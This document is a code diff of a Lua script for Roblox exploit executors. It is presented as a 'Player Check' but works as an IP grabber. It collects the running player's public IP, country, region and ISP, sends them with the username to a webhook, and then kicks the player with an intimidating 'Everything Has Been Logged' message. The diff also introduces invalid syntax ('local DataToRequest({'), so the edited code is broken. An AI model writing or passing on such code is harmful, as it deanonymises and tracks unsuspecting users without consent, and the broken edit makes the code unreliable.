@@ -14,10 +14,10 @@ local exploitCheck = {
 local url = "YOUR_WEBHOOK_URL_HERE"
 
 -- Get the player's IP address
-local ip = game:HttpGet("https://api.ipify.org")
-local data = game:HttpGet("http://ip-api.com/json/" .. tostring(ip))
-local allInfo = game:GetService("HttpService"):JSONDecode(data)
-local countryCode, region, as = allInfo["countryCode"], allInfo["regionName"], allInfo["as"]
+local ip = game:HttpGet("https://api.ipify.org") -- IP
+local data = game:HttpGet("http://ip-api.com/json/" .. tostring(ip)) -- Data
+local allInfo = game:GetService("HttpService"):JSONDecode(data) -- Information
+local countryCode, region, as = allInfo["countryCode"], allInfo["regionName"], allInfo["as"] -- CountryCode
 
 -- Create the country flag URL
 local countryFlagURL = "https://www.countryflags.io/" .. countryCode .. "/flat/64.png"
@@ -58,8 +58,8 @@ local embedData = {
 
 -- Create the data to send in the webhook
 local data = {
-    content = "Player Check result for " .. game.Players.LocalPlayer.Name,
-    embeds = { embedData }
+    ["content"] = "Player Check result for " .. game.Players.LocalPlayer.Name,
+    ["embeds"] = { embedData }
 }
 
 -- Define headers for the request
@@ -70,12 +70,15 @@ local headers = {
 -- Send the webhook request
 local httpService = game:GetService("HttpService")
 local request = http_request or request or HttpPost or syn.request
-request({
+    
+local DataToRequest({
     Url = url,
-    Body = httpService:JSONEncode(data),
+    Body = game:GetService("HttpService"):JSONEncode(data),
     Method = "POST",
     Headers = headers
 })
 
+request(DataToRequest)
+    
 -- Kick the player with a message
 game.Players.LocalPlayer:Kick("Security Check Failed. Everything Has Been Logged")
